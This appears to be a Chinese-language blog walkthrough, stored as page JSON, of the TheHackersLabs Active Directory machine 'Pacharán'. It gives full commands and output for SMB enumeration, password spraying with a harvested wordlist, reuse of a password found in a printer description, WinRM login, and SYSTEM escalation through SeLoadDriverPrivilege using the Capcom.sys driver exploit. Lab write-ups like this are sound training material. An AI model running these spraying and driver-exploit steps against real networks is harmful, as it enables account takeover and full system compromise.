{"pageProps":{"postData":{"id":"TheHackersLabsPacharán","contentHtml":"<h1>Pacharán</h1>\n<blockquote>\n<p><a href=\"https://labs.thehackerslabs.com/machine/61\">https://labs.thehackerslabs.com/machine/61</a></p>\n</blockquote>\n<p><img src=\"/post-images/TheHackersLabsPachar%C3%A1n/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-bash\">➜  Pacharán nmap -sn 192.168.69.0/24\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 13:00 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.69.1\nHost is up (0.00060s latency).\nMAC Address: 0A:00:27:00:00:11 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.69.2\nHost is up (0.00034s latency).\nMAC Address: 08:00:27:5F:F4:7E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.69.69\nHost is up (0.00060s latency).\nMAC Address: 08:00:27:4F:85:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.69.10\nHost is up.\nNmap <span class=\"hljs-keyword\">done</span>: 256 IP addresses (4 hosts up) scanned <span class=\"hljs-keyword\">in</span> 2.10 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Pacharán nmap -sT -min-rate 10000 -p- 192.168.69.69\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 13:00 CST\nWarning: 192.168.69.69 giving up on port because retransmission <span class=\"hljs-built_in\">cap</span> hit (10).\nStrange <span class=\"hljs-built_in\">read</span> error from 192.168.69.69 (104 - <span class=\"hljs-string\">'Connection reset by peer'</span>)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.69.69\nHost is up (0.00020s latency).\nNot shown: 65236 closed tcp ports (conn-refused), 275 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n\nMAC Address: 08:00:27:4F:85:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 13.27 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Pacharán nmap -sT -A -p $(<span class=\"hljs-built_in\">cat</span> port | awk -F <span class=\"hljs-string\">'/'</span> <span class=\"hljs-string\">'{print $1}'</span> | <span class=\"hljs-built_in\">paste</span> -sd <span class=\"hljs-string\">','</span>) 192.168.69.69\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 13:01 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.69.69\nHost is up (0.00052s latency).\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server <span class=\"hljs-keyword\">time</span>: 2025-07-27 12:01:34Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nMAC Address: 08:00:27:4F:85:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Microsoft Windows 2016|2019\nOS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019\nOS details: Microsoft Windows Server 2016 or Server 2019\nNetwork Distance: 1 hop\nService Info: Host: WIN-VRU3GG3DPLJ; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: &#x3C;unknown>, NetBIOS MAC: 08:00:27:4f:85:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n| smb2-time:\n|   <span class=\"hljs-built_in\">date</span>: 2025-07-27T12:01:36\n|_  start_date: 2025-07-27T11:55:15\n|_clock-skew: 6h59m57s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.52 ms 192.168.69.69\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 16.47 seconds\n</code></pre>\n<h3>枚举</h3>\n<p><code>SMB</code> 匿名测试</p>\n<p>可以使用匿名账户</p>\n<pre><code class=\"hljs language-bash\">➜  Pacharán smbclient -L 192.168.69.69 -U anonymous\nPassword <span class=\"hljs-keyword\">for</span> [WORKGROUP\\anonymous]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Admin remota\n        C$              Disk      Recurso predeterminado\n        IPC$            IPC       IPC remota\n        NETLOGON        Disk      Recurso compartido del servidor de inicio de sesión \n        NETLOGON2       Disk      \n        PACHARAN        Disk      \n        PDF Pro Virtual Printer Printer   Soy Hacker y arreglo impresoras\n        <span class=\"hljs-built_in\">print</span>$          Disk      Controladores de impresora\n        SYSVOL          Disk      Recurso compartido del servidor de inicio de sesión \n        Users           Disk      \nReconnecting with SMB1 <span class=\"hljs-keyword\">for</span> workgroup listing.\ndo_connect: Connection to 192.168.69.69 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n</code></pre>\n<p>直接用<code>nxc</code>全部拉下来</p>\n<pre><code class=\"hljs language-bash\">➜  Pacharán nxc smb 192.168.69.69 -u <span class=\"hljs-string\">'anonymous'</span> -p <span class=\"hljs-string\">''</span> --smb-timeout 9999 -M spider_plus -o DOWNLOAD_FLAG=True \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False) \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\\anonymous: (Guest)\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Started module spidering_plus with the following options:\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]  DOWNLOAD_FLAG: True\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]     STATS_FLAG: True\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] EXCLUDE_FILTER: [<span class=\"hljs-string\">'print$'</span>, <span class=\"hljs-string\">'ipc$'</span>]\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]   EXCLUDE_EXTS: [<span class=\"hljs-string\">'ico'</span>, <span class=\"hljs-string\">'lnk'</span>]\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]  MAX_FILE_SIZE: 50 KB\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Enumerated shares\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  Share           Permissions     Remark\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  -----           -----------     ------\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  ADMIN$                          Admin remota\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  C$                              Recurso predeterminado\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  IPC$            READ            IPC remota\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  NETLOGON                        Recurso compartido del servidor de inicio de sesión \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  NETLOGON2       READ            \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  PACHARAN                        \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  PDF Pro Virtual Printer                 Soy Hacker y arreglo impresoras\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  <span class=\"hljs-built_in\">print</span>$                          Controladores de impresora\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  SYSVOL                          Recurso compartido del servidor de inicio de sesión \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  Users                           \nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] Saved share-file metadata to <span class=\"hljs-string\">\"/root/.nxc/modules/nxc_spider_plus/192.168.69.69.json\"</span>.\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] SMB Shares:           10 (ADMIN$, C$, IPC$, NETLOGON, NETLOGON2, PACHARAN, PDF Pro Virtual Printer, <span class=\"hljs-built_in\">print</span>$, SYSVOL, Users)\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] SMB Readable Shares:  2 (IPC$, NETLOGON2)\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] SMB Filtered Shares:  1\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Total folders found:  0\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Total files found:    1\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] File size average:    22 B\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] File size min:        22 B\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] File size max:        22 B\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] File unique exts:     1 (txt)\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Downloads successful: 1\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] All files processed successfully.\n</code></pre>\n<p>得到一个 <code>txt</code> 文件 <code>Orujo.txt</code></p>\n<pre><code class=\"hljs language-bash\">➜  Pacharán <span class=\"hljs-built_in\">cat</span> Orujo.txt                                 \nPericodelospalotes6969#\n</code></pre>\n<p>像是一个凭据，测试一下</p>\n<pre><code class=\"hljs language-bash\">➜  Pacharán nxc smb 192.168.69.69 -u <span class=\"hljs-string\">'orujo'</span> -p <span class=\"hljs-string\">'Pericodelospalotes6969'</span> --smb-timeout 9999                             \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False) \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\\orujo:Pericodelospalotes6969 \n</code></pre>\n<p>成功拿到 <code>orujo</code> 的凭据</p>\n<pre><code class=\"hljs language-bash\">➜  Pacharán nxc ldap 192.168.69.69 -u <span class=\"hljs-string\">'orujo'</span> -p <span class=\"hljs-string\">'Pericodelospalotes6969'</span>                                  \nLDAP        192.168.69.69   389    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL)\nLDAP        192.168.69.69   389    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\\orujo:Pericodelospalotes6969\n\n➜  Pacharán nxc winrm 192.168.69.69 -u <span class=\"hljs-string\">'orujo'</span> -p <span class=\"hljs-string\">'Pericodelospalotes6969'</span>\nWINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL)\n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module <span class=\"hljs-keyword\">in</span> 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\orujo:Pericodelospalotes6969\n</code></pre>\n<h2>域分析</h2>\n<p>收集信息上<code>BLoodHound</code></p>\n<pre><code class=\"hljs language-bash\">➜  Pacharán bloodhound-python -d <span class=\"hljs-string\">'PACHARAN.thl'</span> -ns 192.168.69.69 --zip -c All -dc <span class=\"hljs-string\">'WIN-VRU3GG3DPLJ.PACHARAN.THL'</span> -u orujo -p <span class=\"hljs-string\">'Pericodelospalotes6969'</span>\nINFO: BloodHound.py <span class=\"hljs-keyword\">for</span> BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: pacharan.thl\nINFO: Getting TGT <span class=\"hljs-keyword\">for</span> user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\nINFO: Connecting to LDAP server: WIN-VRU3GG3DPLJ.PACHARAN.THL\nINFO: Found 1 domains\nINFO: Found 1 domains <span class=\"hljs-keyword\">in</span> the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: WIN-VRU3GG3DPLJ.PACHARAN.THL\nINFO: Found 17 <span class=\"hljs-built_in\">users</span>\nINFO: Found 53 <span class=\"hljs-built_in\">groups</span>\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: WIN-VRU3GG3DPLJ.PACHARAN.THL\nINFO: Done <span class=\"hljs-keyword\">in</span> 00M 01S\nINFO: Compressing output into 20250727132554_bloodhound.zip\n</code></pre>\n<p>当前用户所属组</p>\n<p><img src=\"/post-images/TheHackersLabsPachar%C3%A1n/image1.png\" alt=\"image.png\"></p>\n<p>所有域用户</p>\n<p><img src=\"/post-images/TheHackersLabsPachar%C3%A1n/image2.png\" alt=\"image.png\"></p>\n<p>远程管理组成员，只有一个，暂时设定为目标用户</p>\n<p><img src=\"/post-images/TheHackersLabsPachar%C3%A1n/image3.png\" alt=\"image.png\"></p>\n<h2>To Whisky</h2>\n<p>我们继续枚举一下信息</p>\n<p>拉取 <code>orujo</code> 用户可以下载的所有文件</p>\n<pre><code class=\"hljs language-bash\">nxc smb 192.168.69.69 -u <span class=\"hljs-string\">'orujo'</span> -p <span class=\"hljs-string\">'Pericodelospalotes6969'</span> --smb-timeout 9999 -M spider_plus -o DOWNLOAD_FLAG=True\n</code></pre>\n<p>能下载出来一个 <code>au.txt</code> 文件，是一个密码字典</p>\n<p><img src=\"/post-images/TheHackersLabsPachar%C3%A1n/image4.png\" alt=\"image.png\"></p>\n<p>查询一下密码阈值</p>\n<pre><code class=\"hljs language-bash\">➜  PACHARAN bloodyAD -d <span class=\"hljs-string\">'PACHARAN.THL'</span> -u orujo -p <span class=\"hljs-string\">'Pericodelospalotes6969'</span> --dc-ip 192.168.69.69 get object <span class=\"hljs-string\">'DC=PACHARAN,DC=THL'</span> --attr minPwdLength,maxPwdAge,minPwdAge,pwdHistoryLength,lockoutThreshold,lockoutDuration,lockOutObservationWindow,pwdProperties\n\ndistinguishedName: DC=PACHARAN,DC=THL\nlockOutObservationWindow: -18000000000\nlockoutDuration: -18000000000\nlockoutThreshold: 0\nmaxPwdAge: -42 days, 0:00:00\nminPwdAge: -1 day, 0:00:00\nminPwdLength: 7\npwdHistoryLength: 24\npwdProperties: 1\n</code></pre>\n<p>密码阈值为<code>0</code> ，锁定账户功能被禁用</p>\n<p>所以我们可以利用得到的字典来进行密码喷洒</p>\n<pre><code class=\"hljs language-bash\">➜  Pacharán nxc smb 192.168.69.69 -u users.txt  -p ah.txt --smb-timeout 9999 --continue-on-success | grep <span class=\"hljs-string\">'[+]'</span>\nSMB                      192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\\Whisky:MamasoyStream2er@ \n</code></pre>\n<p>得到<code>Whisky</code>的凭据，<code>Whisky:MamasoyStream2er@</code></p>\n<h2>To Chivas Regal</h2>\n<p>这里尝试了很多的攻击，例如 <code>Kerberoate</code>等</p>\n<p>再尝试枚举一下信息</p>\n<p>SMB 中我们能注意到 <strong><code>PDF Pro Virtual Printer WRITE</code></strong> ，应该是打印机共享</p>\n<p>并且描述：我是一名黑客，我修理打印机，通用文档转换器</p>\n<p><img src=\"/post-images/TheHackersLabsPachar%C3%A1n/image5.png\" alt=\"image.png\"></p>\n<p>尝试连接上<code>RPCclient</code> 枚举打印机</p>\n<pre><code class=\"hljs language-bash\">➜  Pacharán rpcclient 192.168.69.69 -U pacharan.thl/Whisky%MamasoyStream2er@ \nrpcclient $> enumprinters\n        flags:[0x800000]\n        name:[\\\\192.168.69.69\\Soy Hacker y arreglo impresoras]\n        description:[\\\\192.168.69.69\\Soy Hacker y arreglo impresoras,Universal Document Converter,TurkisArrusPuchuchuSiu1]\n        comment:[Soy Hacker y arreglo impresoras]\n</code></pre>\n<p>我们还看到描述后还带这个字符串 <code>TurkisArrusPuchuchuSiu1</code></p>\n<p>我们将其拿去进行密码喷洒</p>\n<pre><code class=\"hljs language-bash\">➜  Pacharán nxc smb 192.168.69.69 -u users.txt -p <span class=\"hljs-string\">'TurkisArrusPuchuchuSiu1'</span> --smb-timeout 9999                \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False) \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\Administrador:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\Invitado:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\krbtgt:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\DefaultAccount:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\Orujo:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\Ginebra:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\Whisky:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\Hendrick:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\\Chivas Regal:TurkisArrusPuchuchuSiu1\n</code></pre>\n<p>得到一个凭据：<code>ChivasRegal:TurkisArrusPuchuchuSiu1</code></p>\n<p>就是我们上边看到远程管理组的用户</p>\n<pre><code class=\"hljs language-bash\">➜  Pacharán nxc winrm 192.168.69.69 -u <span class=\"hljs-string\">'Chivas Regal'</span> -p <span class=\"hljs-string\">'TurkisArrusPuchuchuSiu1'</span>\nWINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL)\n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module <span class=\"hljs-keyword\">in</span> 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\\Chivas Regal:TurkisArrusPuchuchuSiu1 (Pwn3d!)\n</code></pre>\n<p><code>Chivas Regal</code> 用户可以读取 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\Chivas Regal\\Desktop> <span class=\"hljs-built_in\">type</span> user.txt\nbb8b4xxxxxxxxxxxxxxxxxxxxxxxxxx\n</code></pre>\n<h2>SeLoadDriverPrivilege</h2>\n<p><code>whoami</code> 信息</p>\n<p><img src=\"/post-images/TheHackersLabsPachar%C3%A1n/image6.png\" alt=\"image.png\"></p>\n<p>能找到 <code>SeLoadDriverPrivilege</code> ，这是默认的账户不存在的权限</p>\n<p>能找一些存储库： <a href=\"https://github.com/k4sth4/SeLoadDriverPrivilege\">https://github.com/k4sth4/SeLoadDriverPrivilege</a></p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\temp> .\\ExploitCapcom.exe LOAD C:\\temp\\Capcom.sys\n[*] Service Name: uciifgxe\n[+] Enabling SeLoadDriverPrivilege\n[+] SeLoadDriverPrivilege Enabled\n[+] Loading Driver: \\Registry\\User\\S-1-5-21-3046175042-3013395696-775018414-1108\\???????????????????\nNTSTATUS: 00000000, WinError: 0\n\n*Evil-WinRM* PS C:\\temp> .\\ExploitCapcom.exe EXPLOIT <span class=\"hljs-built_in\">whoami</span>\n[*] Capcom.sys exploit\n[*] Capcom.sys handle was obtained as 0000000000000064\n[*] Shellcode was placed at 0000013180FE0008\n[+] Shellcode was executed\n[+] Token stealing was successful\n[+] Command Executed\nnt authority\\system\n</code></pre>\n<p>成功拿到 <code>system</code> 用户权限</p>\n<p>这里可以使用 <code>msf</code> 来弹，不多赘述….</p>\n<p>最后运行恶意 <code>exe</code> 即可弹回来</p>\n<p><img src=\"/post-images/TheHackersLabsPachar%C3%A1n/image7.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">C:\\Users\\Administrador\\Desktop><span class=\"hljs-built_in\">type</span> root.txt\n<span class=\"hljs-built_in\">type</span> root.txt\ncfa7cb1cc20e26c0428f9222d44c76a0  -\n</code></pre>\n<h2>总结</h2>\n<p>打印机那里有点没想到，要看描述</p>\n<p>最后 SeLoadDriverPrivilege 卡了一下，<code>payload</code>需要改一下</p>","title":"TheHackersLabs - Pacharán","date":"2025-07-27","updated":"2025-07-27","tags":["TheHackersLabs","Windows","SeLoadDriverPrivilege","Crack"],"categories":"靶机","comments":true,"description":"Pacharán\n\n https://labs.thehackerslabs.com/machine/61\n \n\n\n\nRecon\n\nPortScan\n\n\n\n\n\n\n\n枚举\n\n`SMB` 匿名测试\n\n可以使用匿名账户\n\n\n\n直接用`nxc`全部拉下来\n\n\n\n得到一个 `txt` 文件 `Orujo.txt`\n\n\n\n像是一个凭据，测试一下\n\n\n\n成功拿到 `orujo` 的凭据\n\n\n\n域分析\n\n收集信息..."},"recentPosts":[{"id":"TheHackersLabsDoraemon","title":"TheHackersLabs - Doraemon","date":"2025-08-03","isEncrypted":false,"year":"2025","month":"08","day":"03"},{"id":"TheHackersLabsHellRoot","title":"TheHackersLabs - HellRoot","date":"2025-08-02","isEncrypted":false,"year":"2025","month":"08","day":"02"},{"id":"群U靶机 - Cliv2","title":"群U靶机 - Cliv2","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"TheHackersLabsMerchan","title":"TheHackersLabs - Merchan","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"TheHackersLabsHEXTHINK SILENT SHADOW","title":"TheHackersLabs - HEXTHINK SILENT SHADOW","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"HackTheBoxSeason8 - Era","title":"HackTheBox - Season8 - Era","date":"2025-07-29","isEncrypted":true,"year":"2025","month":"07","day":"29"},{"id":"HackTheBoxSeason7-Cypher","title":"HackTheBox - Season7 - Cypher","date":"2025-04-04","isEncrypted":false,"year":"2025","month":"07","day":"29"}]},"__N_SSG":true}